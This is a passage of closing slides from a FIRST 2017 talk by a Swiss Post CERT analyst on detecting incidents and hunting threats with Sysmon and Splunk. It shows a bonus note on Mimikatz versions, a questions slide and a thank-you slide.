 Bonus: all versions of Mimikatz?
 Everyone sitting now I would like to have a chat 

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 117

Do you have questions?
 Is there time left for Q&A?

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 118

Thank you for your attention!
Tom Ueltschi, Swiss Post CERT

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 119

